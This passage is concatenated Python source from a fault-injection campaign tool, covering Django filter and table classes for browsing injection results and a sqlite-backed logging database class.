            except KeyboardInterrupt:
                if self.campaign_data['use_simics']:
                    self.debugger.continue_dut()
                self.debugger.dut.serial.write('\x03')
                self.debugger.dut.read_until()
                if self.campaign_data['use_aux']:
                    self.debugger.aux.serial.write('\x03')
                    self.debugger.aux.read_until()
                self.result_data.update({
                    'outcome_category': 'Incomplete',
                    'outcome': 'Interrupted'})
                interrupted = True
            self.log_result()
            if packet_capture:
                os.system('ssh p2020 \'killall tshark\'')
                capture_process.wait()
                capture_file.close()

from django.forms import SelectMultiple, Textarea
import django_filters
from re import split

from .models import (event, injection, result, simics_register_diff)


def fix_sort(string):
    return ''.join([text.zfill(5) if text.isdigit() else text.lower() for
                    text in split('([0-9]+)', str(string))])


def fix_sort_list(list):
    return fix_sort(list[0])


def result_choices(campaign, attribute):
    choices = []
    for item in result.objects.filter(campaign_id=campaign).values_list(
            attribute, flat=True).distinct():
        if item is not None:
            choices.append((item, item))
    return sorted(choices, key=fix_sort_list)


class injection_filter(django_filters.FilterSet):
    def __init__(self, *args, **kwargs):
        campaign = kwargs['campaign']
        del kwargs['campaign']
        super(injection_filter, self).__init__(*args, **kwargs)
        bit_choices = self.injection_choices(campaign, 'bit')
        self.filters['bit'].extra.update(choices=bit_choices)
        self.filters['bit'].widget.attrs['size'] = min(len(bit_choices), 10)
        checkpoint_number_choices = self.injection_choices(
            campaign, 'checkpoint_number')
        self.filters['checkpoint_number'].extra.update(
            choices=checkpoint_number_choices)
        self.filters['checkpoint_number'].widget.attrs['size'] = min(
            len(checkpoint_number_choices), 10)
        field_choices = self.injection_choices(campaign, 'field')
        self.filters['field'].extra.update(choices=field_choices)
        self.filters['field'].widget.attrs['size'] = min(len(field_choices), 10)
        register_choices = self.injection_choices(campaign, 'register')
        self.filters['register'].extra.update(choices=register_choices)
        self.filters['register'].widget.attrs['size'] = min(
            len(register_choices), 10)
        register_index_choices = self.injection_choices(
            campaign, 'register_index')
        self.filters['register_index'].extra.update(
            choices=register_index_choices)
        self.filters['register_index'].widget.attrs['size'] = min(
            len(register_index_choices), 10)
        num_injections_choices = result_choices(campaign, 'num_injections')
        self.filters['result__num_injections'].extra.update(
            choices=num_injections_choices)
        self.filters['result__num_injections'].widget.attrs['size'] = min(
            len(num_injections_choices), 10)
        outcome_choices = result_choices(campaign, 'outcome')
        self.filters['result__outcome'].extra.update(choices=outcome_choices)
        self.filters['result__outcome'].widget.attrs['size'] = min(
            len(outcome_choices), 10)
        outcome_category_choices = result_choices(campaign, 'outcome_category')
        self.filters['result__outcome_category'].extra.update(
            choices=outcome_category_choices)
        self.filters['result__outcome_category'].widget.attrs['size'] = min(
            len(outcome_category_choices), 10)
        self.filters['success'].extra.update(help_text='')
        target_choices = self.injection_choices(campaign, 'target')
        self.filters['target'].extra.update(choices=target_choices)
        self.filters['target'].widget.attrs['size'] = min(
            len(target_choices), 10)
        target_index_choices = self.injection_choices(campaign, 'target_index')
        self.filters['target_index'].extra.update(choices=target_index_choices)
        self.filters['target_index'].widget.attrs['size'] = min(
            len(target_index_choices), 10)

    def injection_choices(self, campaign, attribute):
        choices = []
        for item in injection.objects.filter(
            result__campaign_id=campaign).values_list(
                attribute, flat=True).distinct():
            if item is not None:
                choices.append((item, item))
        return sorted(choices, key=fix_sort_list)

    bit = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    checkpoint_number = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    field = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    register = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    register_index = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    result__aux_output = django_filters.CharFilter(
        label='AUX output',
        lookup_type='icontains',
        widget=Textarea(attrs={'cols': 16, 'rows': 3, 'type': 'search'}),
        help_text='')
    result__data_diff_gt = django_filters.NumberFilter(
        name='result__data_diff', label='Data diff (>)', lookup_type='gt',
        help_text='')
    result__data_diff_lt = django_filters.NumberFilter(
        name='result__data_diff', label='Data diff (<)', lookup_type='lt',
        help_text='')
    result__debugger_output = django_filters.CharFilter(
        label='Debugger output',
        lookup_type='icontains',
        widget=Textarea(attrs={'cols': 16, 'rows': 3, 'type': 'search'}),
        help_text='')
    result__dut_output = django_filters.CharFilter(
        label='DUT output',
        lookup_type='icontains',
        widget=Textarea(attrs={'cols': 16, 'rows': 3, 'type': 'search'}),
        help_text='')
    result__num_injections = django_filters.MultipleChoiceFilter(
        label='Number of injections',
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    result__outcome = django_filters.MultipleChoiceFilter(
        label='Outcome',
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    result__outcome_category = django_filters.MultipleChoiceFilter(
        label='Outcome category',
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    target = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    target_index = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    time_gt = django_filters.NumberFilter(
        name='time', label='Time (>)', lookup_type='gt', help_text='')
    time_lt = django_filters.NumberFilter(
        name='time', label='Time (<)', lookup_type='lt', help_text='')

    class Meta:
        model = injection
        fields = ('result__outcome_category', 'result__outcome',
                  'result__data_diff_gt', 'result__data_diff_lt',
                  'result__dut_output', 'result__aux_output',
                  'result__debugger_output', 'result__num_injections',
                  'checkpoint_number', 'time_gt', 'time_lt', 'target',
                  'target_index', 'register', 'register_index', 'bit', 'field',
                  'success')


class event_filter(django_filters.FilterSet):
    def __init__(self, *args, **kwargs):
        campaign = kwargs['campaign']
        del kwargs['campaign']
        super(event_filter, self).__init__(*args, **kwargs)
        event_type_choices = self.event_choices(campaign, 'event_type')
        self.filters['event_type'].extra.update(choices=event_type_choices)
        self.filters['event_type'].widget.attrs['size'] = min(
            len(event_type_choices), 10)
        source_choices = self.event_choices(campaign, 'source')
        self.filters['source'].extra.update(choices=source_choices)
        self.filters['source'].widget.attrs['size'] = min(
            len(source_choices), 10)

    def event_choices(self, campaign, attribute):
        choices = []
        for item in event.objects.filter(
            result__campaign_id=campaign).values_list(
                attribute, flat=True).distinct():
            if item is not None:
                choices.append((item, item))
        return sorted(choices, key=fix_sort_list)

    description = django_filters.CharFilter(
        lookup_type='icontains',
        widget=Textarea(attrs={'cols': 16, 'rows': 3, 'type': 'search'}),
        help_text='')
    event_type = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    source = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')

    class Meta:
        model = event
        fields = ('source', 'event_type', 'description')                    


class simics_register_diff_filter(django_filters.FilterSet):
    def __init__(self, *args, **kwargs):
        self.campaign = kwargs['campaign']
        del kwargs['campaign']
        super(simics_register_diff_filter, self).__init__(*args, **kwargs)
        self.queryset = kwargs['queryset']
        checkpoint_number_choices = self.simics_register_diff_choices(
            'checkpoint_number')
        self.filters['checkpoint_number'].extra.update(
            choices=checkpoint_number_choices)
        self.filters['checkpoint_number'].widget.attrs['size'] = min(
            len(checkpoint_number_choices), 10)
        register_choices = self.simics_register_diff_choices('register')
        self.filters['register'].extra.update(choices=register_choices)
        self.filters['register'].widget.attrs['size'] = min(
            len(register_choices), 10)

    def simics_register_diff_choices(self, attribute):
        choices = []
        for item in self.queryset.filter(
            result__campaign_id=self.campaign
                ).values_list(attribute, flat=True).distinct():
            choices.append((item, item))
        return sorted(choices, key=fix_sort_list)

    checkpoint_number = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    register = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')

    class Meta:
        model = simics_register_diff
        fields = ('checkpoint_number', 'register')

import django_tables2 as tables

from .models import (campaign, event, injection, result, simics_memory_diff,
                     simics_register_diff)


class campaigns_table(tables.Table):
    id_ = tables.TemplateColumn(
        '<a href="/campaign/{{ value }}/results">{{ value }}</a>',
        accessor='id')
    num_cycles = tables.Column()
    results = tables.Column(empty_values=(), orderable=False)

    def render_num_cycles(self, record):
        return '{:,}'.format(record.num_cycles)

    def render_results(self, record):
        return '{:,}'.format(
            result.objects.filter(campaign=record.id).count())

    class Meta:
        attrs = {"class": "paleblue"}
        model = campaign
        fields = ('id_', 'results', 'command', 'aux_command', 'architecture',
                  'use_simics', 'exec_time', 'sim_time', 'num_cycles',
                  'timestamp')
        order_by = 'id_'


class campaign_table(campaigns_table):
    num_checkpoints = tables.Column()
    cycles_between = tables.Column()
    results = tables.Column(empty_values=(), orderable=False)

    def render_num_checkpoints(self, record):
        return '{:,}'.format(record.num_checkpoints)

    def render_cycles_between(self, record):
        return '{:,}'.format(record.cycles_between)

    class Meta:
        attrs = {"class": "paleblue"}
        model = campaign
        exclude = ('id_',)
        fields = ('id', 'timestamp', 'results', 'command', 'aux_command',
                  'architecture', 'use_simics', 'use_aux', 'exec_time',
                  'sim_time', 'num_cycles', 'output_file', 'num_checkpoints',
                  'cycles_between')


class results_table(tables.Table):
    events = tables.Column(empty_values=(), orderable=False)
    id_ = tables.TemplateColumn(  # LinkColumn()
        '<a href="./result/{{ value }}">{{ value }}</a>', accessor='id')
    registers = tables.Column(empty_values=(), orderable=False)
    select = tables.TemplateColumn(
        '<input type="checkbox" name="select_box" value="{{ record.id }}">',
        verbose_name='', orderable=False)
    timestamp = tables.DateTimeColumn(format='m/d/Y H:i:s.u')
    targets = tables.Column(empty_values=(), orderable=False)

    def render_events(self, record):
        return '{:,}'.format(
            event.objects.filter(result_id=record.id).count())

    def render_registers(self, record):
        if record is not None:
            registers = [injection_.register for injection_
                         in injection.objects.filter(result=record.id)]
        else:
            registers = []
        for index in range(len(registers)):
            if registers[index] is None:
                registers[index] = '-'
        if len(registers) > 0:
            return ', '.join(registers)
        else:
            return '-'

    def render_targets(self, record):
        if record is not None:
            targets = [injection_.target for injection_
                       in injection.objects.filter(result=record.id)]
        else:
            targets = []
        for index in range(len(targets)):
            if targets[index] is None:
                targets[index] = '-'
        if len(targets) > 0:
            return ', '.join(targets)
        else:
            return '-'

    class Meta:
        attrs = {"class": "paleblue"}
        model = result
        fields = ('select', 'id_', 'timestamp', 'outcome_category', 'outcome',
                  'data_diff', 'detected_errors', 'num_injections', 'targets',                    
                  'registers')                    
        order_by = 'id_'


class result_table(results_table):
    outcome = tables.TemplateColumn(
        '<input name="outcome" type="text" value="{{ value }}" />')
    outcome_category = tables.TemplateColumn(
        '<input name="outcome_category" type="text" value="{{ value }}" />')
    edit = tables.TemplateColumn(
        '<input type="submit" name="save" value="Save" onclick="return confirm('
        '"Are you sure you want to edit this result?")"/>')
    delete = tables.TemplateColumn(
        '<input type="submit" name="delete" value="Delete" onclick="return '
        'confirm("Are you sure you want to delete this result?")" />')

    class Meta:
        attrs = {"class": "paleblue"}
        model = result
        exclude = ('id_', 'select', 'targets')
        fields = ('id', 'timestamp', 'outcome_category', 'outcome',
                  'num_injections', 'data_diff', 'detected_errors')


class event_table(tables.Table):
    description = tables.TemplateColumn(
        '<code class="console">{{ value }}</code>')
    timestamp = tables.DateTimeColumn(format='m/d/Y H:i:s.u')

    class Meta:
        attrs = {"class": "paleblue"}
        model = event
        fields = ('timestamp', 'source', 'event_type', 'description')


class hw_injection_table(tables.Table):
    timestamp = tables.DateTimeColumn(format='m/d/Y H:i:s.u')

    class Meta:
        attrs = {"class": "paleblue"}
        model = injection
        exclude = ('config_object', 'config_type', 'checkpoint_number', 'field',
                   'id', 'register_index', 'result')


class simics_injection_table(tables.Table):
    timestamp = tables.DateTimeColumn(format='m/d/Y H:i:s.u')

    class Meta:
        attrs = {"class": "paleblue"}
        model = injection
        fields = ('injection_number', 'timestamp', 'checkpoint_number',
                  'target', 'target_index', 'register', 'register_index', 'bit',
                  'field', 'gold_value', 'injected_value', 'success')


class simics_register_diff_table(tables.Table):
    class Meta:
        attrs = {"class": "paleblue"}
        model = simics_register_diff
        exclude = ('id', 'result')


class simics_memory_diff_table(tables.Table):
    class Meta:
        attrs = {"class": "paleblue"}
        model = simics_memory_diff
        exclude = ('id', 'result')

from datetime import datetime
from os.path import exists
from sqlite3 import connect
from termcolor import colored
from threading import Lock
from traceback import format_exc, format_stack


class database(object):
    log_exception = '__LOG_EXCEPTION__'
    log_trace = '__LOG_TRACE__'

    def __init__(self, campaign={}, create_result=False,
                 database_file='campaign-data/db.sqlite3'):
        if not exists(database_file):
            raise Exception('could not find database file: '+database_file)
        self.campaign = campaign
        self.result = {}
        self.file = database_file
        self.lock = Lock()
        if create_result:
            with self as db:
                db.__create_result()

    def __enter__(self):

        def dict_factory(cursor, row):
            dictionary = {}
            for id_, column in enumerate(cursor.description):
                dictionary[column[0]] = row[id_]
            return dictionary

    # def __enter__(self):
        self.lock.acquire()
        self.connection = connect(self.file, timeout=30)
        self.connection.row_factory = dict_factory
        self.cursor = self.connection.cursor()
        return self

    def insert(self, table, dictionary=None):
        if dictionary is None:
            if table == 'campaign':
                dictionary = self.campaign
            elif table == 'result':
                dictionary = self.result
        if 'timestamp' in dictionary:
            dictionary['timestamp'] = datetime.now()
        if 'id' in dictionary:
            del dictionary['id']
        self.cursor.execute(
            'INSERT INTO log_{} ({}) VALUES ({})'.format(
                table,
                ','.join(dictionary.keys()),
                ','.join('?'*len(dictionary))),
            list(dictionary.values()))
        dictionary['id'] = self.cursor.lastrowid

    def update(self, table, dictionary=None):
        if table == 'campaign':
            dictionary = self.campaign
        elif table == 'result':
            dictionary = self.result
        if 'timestamp' in dictionary:
            dictionary['timestamp'] = datetime.now()
        self.cursor.execute(
            'UPDATE log_{} SET {}=? WHERE id={}'.format(
                table,
                '=?,'.join(dictionary.keys()),
                str(dictionary['id'])),
            list(dictionary.values()))

    def __create_result(self):
        self.result.update({'campaign_id': self.campaign['id'],
                            'aux_output': '',
                            'data_diff': None,
                            'debugger_output': '',
                            'detected_errors': None,
                            'dut_output': '',
                            'num_injections': None,
                            'outcome_category': 'Incomplete',
                            'outcome': 'Incomplete',                    
                            'timestamp': None})
        self.insert('result')

    def log_result(self, create_result=True):
        out = (self.result['dut_serial_port']+', '+str(self.result['id']) +
               ': '+self.result['outcome_category']+' - ' +
               self.result['outcome'])
        if self.result['data_diff'] is not None and \
                self.result['data_diff'] < 1.0:
            out += ' {0:.2f}%'.format(max(self.result['data_diff']*100,
                                          99.990))
        print(colored(out, 'blue'))
        self.update('result')
        if create_result:
            self.__create_result()

    def log_event(self, level, source, event_type, description=None,
                  campaign=False, success=None):                    
        if description == self.log_trace:
            description = ''.join(format_stack()[:-2])
        elif description == self.log_exception:
            description = ''.join(format_exc())
        event = {'description': description,
                 'event_type': event_type,
                 'level': level,
                 'source': source,
                 'success': success,
                 'timestamp': None}
        if self.result and not campaign:
            event['result_id'] = self.result['id']
        else:
            event['campaign_id'] = self.campaign['id']
        self.insert('event', event)
        return event

    def log_event_success(self, event, success=True):
        event['success'] = success
        self.update('event', event)

    def get_campaign(self):
        if not self.campaign['id']:
            self.cursor.execute('SELECT * FROM log_campaign '
                                'ORDER BY id DESC LIMIT 1')
            return self.cursor.fetchone()
        elif self.campaign['id'] == '*':
            self.cursor.execute('SELECT * FROM log_campaign ORDER BY id')
            return self.cursor.fetchall()
        else:
            self.cursor.execute('SELECT * FROM log_campaign WHERE id=?',
                                [self.campaign['id']])
            return self.cursor.fetchone()

    def get_result(self):
        self.cursor.execute('SELECT * FROM log_result WHERE campaign_id=?',
                            [self.campaign['id']])
        return self.cursor.fetchall()

    def get_item(self, item):
        self.cursor.execute('SELECT * FROM log_'+item+' WHERE result_id=? ',
                            [self.result['id']])
        return self.cursor.fetchall()

    def get_count(self, item, item_from='result'):
        self.cursor.execute('SELECT COUNT(*) FROM log_'+item+' WHERE ' +
                            item_from+'_id=?', [getattr(self, item_from)['id']])
        return self.cursor.fetchone()['COUNT(*)']

    def delete_result(self):
        self.cursor.execute('DELETE FROM log_simics_memory_diff '
                            'WHERE result_id=?', [self.result['id']])
        self.cursor.execute('DELETE FROM log_simics_register_diff '
                            'WHERE result_id=?', [self.result['id']])
        self.cursor.execute('DELETE FROM log_injection WHERE result_id=?',
                            [self.result['id']])
        self.cursor.execute('DELETE FROM log_event WHERE result_id=?',
                            [self.result['id']])
        self.cursor.execute('DELETE FROM log_result WHERE id=?',
                            [self.result['id']])

    def delete_results(self):
        self.cursor.execute('DELETE FROM log_simics_memory_diff WHERE '
                            'result_id IN (SELECT id FROM log_result '
                            'WHERE campaign_id=?)', [self.campaign['id']])
        self.cursor.execute('DELETE FROM log_simics_register_diff WHERE '
                            'result_id IN (SELECT id FROM log_result '
                            'WHERE campaign_id=?)', [self.campaign['id']])
        self.cursor.execute('DELETE FROM log_injection WHERE '
                            'result_id IN (SELECT id FROM log_result '
                            'WHERE campaign_id=?)', [self.campaign['id']])
        self.cursor.execute('DELETE FROM log_event WHERE '
                            'result_id IN (SELECT id FROM log_result '
                            'WHERE campaign_id=?)', [self.campaign['id']])
        self.cursor.execute('DELETE FROM log_result WHERE campaign_id=?',
                            [self.campaign['id']])

    def delete_campaign(self):
        self.delete_results()
        self.cursor.execute('DELETE FROM log_event WHERE campaign_id=?',
                            [self.campaign['id']])
        self.cursor.execute('DELETE FROM log_campaign WHERE id=?',
                            [self.campaign['id']])

    def __exit__(self, type_, value, traceback):                    
        self.connection.commit()                    
        self.connection.close()                    
        self.lock.release()                    
        if type_ is not None or value is not None or traceback is not None:                    
            return False  # reraise exception




from django.forms import SelectMultiple, Textarea
from django_filters import (BooleanFilter, CharFilter, FilterSet,
                            MultipleChoiceFilter, NumberFilter)
from re import split

from .models import (event, injection, result, simics_register_diff)


def fix_sort(string):
    return ''.join([text.zfill(5) if text.isdigit() else text.lower() for
                    text in split('([0-9]+)', str(string))])


def fix_sort_list(list):
    return fix_sort(list[0])


class result_filter(FilterSet):
    def __init__(self, *args, **kwargs):
        campaign = kwargs['campaign']
        del kwargs['campaign']
        super().__init__(*args, **kwargs)
        event_type_choices = self.event_choices(campaign, 'event_type')
        self.filters['event__event_type'].extra.update(
            choices=event_type_choices)
        self.filters['event__event_type'].widget.attrs['size'] = min(
            len(event_type_choices), 10)
        level_choices = self.event_choices(campaign, 'level')
        self.filters['event__level'].extra.update(choices=level_choices)
        self.filters['event__level'].widget.attrs['size'] = min(
            len(level_choices), 10)
        source_choices = self.event_choices(campaign, 'source')
        self.filters['event__source'].extra.update(choices=source_choices)
        self.filters['event__source'].widget.attrs['size'] = min(
            len(source_choices), 10)
        bit_choices = self.injection_choices(campaign, 'bit')
        self.filters['injection__bit'].extra.update(choices=bit_choices)
        self.filters['injection__bit'].widget.attrs['size'] = min(
            len(bit_choices), 10)
        checkpoint_number_choices = self.injection_choices(
            campaign, 'checkpoint_number')
        self.filters['injection__checkpoint_number'].extra.update(
            choices=checkpoint_number_choices)
        self.filters['injection__checkpoint_number'].widget.attrs['size'] = min(
            len(checkpoint_number_choices), 10)
        field_choices = self.injection_choices(campaign, 'field')
        self.filters['injection__field'].extra.update(choices=field_choices)
        self.filters['injection__field'].widget.attrs['size'] = min(
            len(field_choices), 10)
        processor_mode_choices = self.injection_choices(
            campaign, 'processor_mode')
        self.filters['injection__processor_mode'].extra.update(
            choices=processor_mode_choices)
        self.filters['injection__processor_mode'].widget.attrs['size'] = min(
            len(processor_mode_choices), 10)
        register_choices = self.injection_choices(campaign, 'register')
        self.filters['injection__register'].extra.update(
            choices=register_choices)
        self.filters['injection__register'].widget.attrs['size'] = min(
            len(register_choices), 10)
        register_index_choices = self.injection_choices(
            campaign, 'register_index')
        self.filters['injection__register_index'].extra.update(
            choices=register_index_choices)
        self.filters['injection__register_index'].widget.attrs['size'] = min(
            len(register_index_choices), 10)
        target_choices = self.injection_choices(campaign, 'target')
        self.filters['injection__target'].extra.update(choices=target_choices)
        self.filters['injection__target'].widget.attrs['size'] = min(
            len(target_choices), 10)
        target_index_choices = self.injection_choices(campaign, 'target_index')
        self.filters['injection__target_index'].extra.update(
            choices=target_index_choices)
        self.filters['injection__target_index'].widget.attrs['size'] = min(
            len(target_index_choices), 10)
        num_injections_choices = self.result_choices(campaign, 'num_injections')
        self.filters['num_injections'].extra.update(
            choices=num_injections_choices)
        self.filters['num_injections'].widget.attrs['size'] = min(
            len(num_injections_choices), 10)
        outcome_choices = self.result_choices(campaign, 'outcome')
        self.filters['outcome'].extra.update(choices=outcome_choices)
        self.filters['outcome'].widget.attrs['size'] = min(
            len(outcome_choices), 10)
        outcome_category_choices = self.result_choices(
            campaign, 'outcome_category')
        self.filters['outcome_category'].extra.update(
            choices=outcome_category_choices)
        self.filters['outcome_category'].widget.attrs['size'] = min(
            len(outcome_category_choices), 10)

    def event_choices(self, campaign, attribute):
        choices = []
        for item in event.objects.filter(
            result__campaign_id=campaign).values_list(
                attribute, flat=True).distinct():
            if item is not None:
                choices.append((item, item))
        return sorted(choices, key=fix_sort_list)

    def injection_choices(self, campaign, attribute):
        choices = []
        for item in injection.objects.filter(
            result__campaign_id=campaign).values_list(
                attribute, flat=True).distinct():
            if item is not None:
                choices.append((item, item))
        return sorted(choices, key=fix_sort_list)

    def result_choices(self, campaign, attribute):
        choices = []
        for item in result.objects.filter(campaign_id=campaign).values_list(
                attribute, flat=True).distinct():
            if item is not None:
                choices.append((item, item))
        return sorted(choices, key=fix_sort_list)

    aux_output = CharFilter(
        label='AUX output',                    
        lookup_type='icontains',
        widget=Textarea(attrs={'cols': 16, 'rows': 3, 'type': 'search'}),
        help_text='')
    data_diff_gt = NumberFilter(
        name='data_diff', label='Data diff (>)', lookup_type='gt',
        help_text='')
    data_diff_lt = NumberFilter(
        name='data_diff', label='Data diff (<)', lookup_type='lt',
        help_text='')
    debugger_output = CharFilter(
        label='Debugger output',                    
        lookup_type='icontains',
        widget=Textarea(attrs={'cols': 16, 'rows': 3, 'type': 'search'}),
        help_text='')
    detected_errors = NumberFilter(
        name='detected_errors', label='Detected errors (>)', lookup_type='gt',
        help_text='')
    detected_errors_lt = NumberFilter(
        name='detected_errors', label='Detected errors (<)', lookup_type='lt',
        help_text='')
    dut_output = CharFilter(
        label='DUT output',                    
        lookup_type='icontains',
        widget=Textarea(attrs={'cols': 16, 'rows': 3, 'type': 'search'}),
        help_text='')
    event__description = CharFilter(
        lookup_type='icontains',
        widget=Textarea(attrs={'cols': 16, 'rows': 3, 'type': 'search'}),
        help_text='')
    event__event_type = MultipleChoiceFilter(
        conjoined=True, label='Event type',
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    event__level = MultipleChoiceFilter(
        conjoined=True,
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    event__source = MultipleChoiceFilter(
        conjoined=True,
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    event__success = BooleanFilter(help_text='')
    injection__bit = MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    injection__checkpoint_number = MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    injection__field = MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    injection__processor_mode = MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    injection__register = MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    injection__register_index = MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    injection__success = BooleanFilter(help_text='')
    injection__target = MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    injection__target_index = MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    injection__time_gt = NumberFilter(
        name='time', label='Injection time (>)', lookup_type='gt', help_text='')
    injection__time_lt = NumberFilter(
        name='time', label='Injection time (<)', lookup_type='lt', help_text='')
    num_injections = MultipleChoiceFilter(
        label='Number of injections',
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    outcome = MultipleChoiceFilter(
        label='Outcome',                    
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    outcome_category = MultipleChoiceFilter(
        label='Outcome category',                    
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')

    class Meta:
        model = result
        exclude = ('aux_serial_port', 'campaign', 'data_diff',
                   'detected_errors', 'dut_serial_port', 'timestamp')                    


class simics_register_diff_filter(FilterSet):
    def __init__(self, *args, **kwargs):
        self.campaign = kwargs['campaign']
        del kwargs['campaign']
        super().__init__(*args, **kwargs)
        self.queryset = kwargs['queryset']
        checkpoint_number_choices = self.simics_register_diff_choices(
            'checkpoint_number')
        self.filters['checkpoint_number'].extra.update(
            choices=checkpoint_number_choices)
        self.filters['checkpoint_number'].widget.attrs['size'] = min(
            len(checkpoint_number_choices), 10)
        register_choices = self.simics_register_diff_choices('register')
        self.filters['register'].extra.update(choices=register_choices)
        self.filters['register'].widget.attrs['size'] = min(
            len(register_choices), 10)

    def simics_register_diff_choices(self, attribute):
        choices = []
        for item in self.queryset.filter(
            result__campaign_id=self.campaign
                ).values_list(attribute, flat=True).distinct():
            choices.append((item, item))
        return sorted(choices, key=fix_sort_list)

    checkpoint_number = MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    register = MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')

    class Meta:
        model = simics_register_diff
        fields = ('checkpoint_number', 'register')

from django_tables2 import Column, DateTimeColumn, Table, TemplateColumn                    

from .models import (campaign, event, injection, result, simics_memory_diff,
                     simics_register_diff)

datetime_format = 'M j, Y h:i:s A'


class campaigns_table(Table):
    id_ = TemplateColumn(
        '<a href="/campaign/{{ value }}/results">{{ value }}</a>',
        accessor='id')
    num_cycles = Column()                    
    results = Column(empty_values=(), orderable=False)
    timestamp = DateTimeColumn(format=datetime_format)

    def render_num_cycles(self, record):
        return '{:,}'.format(record.num_cycles)

    def render_results(self, record):
        return '{:,}'.format(
            result.objects.filter(campaign=record.id).count())

    class Meta:
        attrs = {"class": "paleblue"}
        model = campaign
        fields = ('id_', 'results', 'command', 'aux_command', 'description',
                  'architecture', 'simics', 'exec_time', 'sim_time',
                  'num_cycles', 'timestamp')
        order_by = 'id_'


class campaign_table(campaigns_table):
    cycles_between = Column()                    
    num_checkpoints = Column()                    
    results = Column(empty_values=(), orderable=False)
    timestamp = DateTimeColumn(format=datetime_format)

    def render_num_checkpoints(self, record):
        return '{:,}'.format(record.num_checkpoints)

    def render_cycles_between(self, record):
        return '{:,}'.format(record.cycles_between)

    class Meta:
        attrs = {"class": "paleblue"}
        model = campaign
        exclude = ('id_',)
        fields = ('id', 'timestamp', 'results', 'command', 'aux_command',
                  'description', 'architecture', 'simics', 'aux', 'exec_time',
                  'sim_time', 'num_cycles', 'output_file', 'num_checkpoints',
                  'cycles_between')


class results_table(Table):
    events = Column(empty_values=(), orderable=False)
    id_ = TemplateColumn(  # LinkColumn()
        '<a href="./result/{{ value }}">{{ value }}</a>', accessor='id')
    registers = Column(empty_values=(), orderable=False)
    select = TemplateColumn(                    
        '<input type="checkbox" name="select_box" value="{{ record.id }}">',                    
        verbose_name='', orderable=False)                    
    injection_success = Column(empty_values=(), orderable=False)
    timestamp = DateTimeColumn(format=datetime_format)
    targets = Column(empty_values=(), orderable=False)

    def render_events(self, record):
        return '{:,}'.format(
            event.objects.filter(result_id=record.id).count())

    def render_registers(self, record):
        if record is not None:
            registers = [injection_.register for injection_
                         in injection.objects.filter(result=record.id)]
        else:
            registers = []
        for index in range(len(registers)):
            if registers[index] is None:
                registers[index] = '-'
        if len(registers) > 0:
            return ', '.join(registers)
        else:
            return '-'

    def render_injection_success(self, record):
        success = '-'
        if record is not None:
            for injection_ in injection.objects.filter(result=record.id):
                if injection_.success is None:
                    success = '-'
                elif not injection_.success:
                    success = False
                    break
                else:
                    success = True
        return success

    def render_targets(self, record):
        if record is not None:
            targets = [injection_.target for injection_
                       in injection.objects.filter(result=record.id)]
        else:
            targets = []
        for index in range(len(targets)):
            if targets[index] is None:
                targets[index] = '-'
        if len(targets) > 0:
            return ', '.join(targets)
        else:
            return '-'

    class Meta:
        attrs = {"class": "paleblue"}
        model = result
        fields = ('select', 'id_', 'dut_serial_port', 'timestamp',                    
                  'outcome_category', 'outcome', 'data_diff', 'detected_errors',
                  'events', 'num_injections', 'targets', 'registers',
                  'injection_success')
        order_by = '-id_'


class result_table(results_table):                    
    delete = TemplateColumn(
        '<input type="submit" name="delete" value="Delete" onclick="return '                    
        'confirm("Are you sure you want to delete this result?")" />')
    edit = TemplateColumn(
        '<input type="submit" name="save" value="Save" onclick="return confirm('                    
        '"Are you sure you want to edit this result?")"/>')
    outcome = TemplateColumn(
        '<input name="outcome" type="text" value="{{ value }}" />')                    
    outcome_category = TemplateColumn(
        '<input name="outcome_category" type="text" value="{{ value }}" />')                    
    timestamp = DateTimeColumn(format=datetime_format)

    class Meta:
        attrs = {"class": "paleblue"}
        model = result
        exclude = ('id_', 'select', 'targets')                    
        fields = ('id', 'dut_serial_port', 'timestamp', 'outcome_category',
                  'outcome', 'num_injections', 'data_diff', 'detected_errors')                    


class event_table(Table):
    description = TemplateColumn(
        '{% if value %}<code class="console">{{ value }}</code>{% endif %}')                    
    timestamp = DateTimeColumn(format=datetime_format)

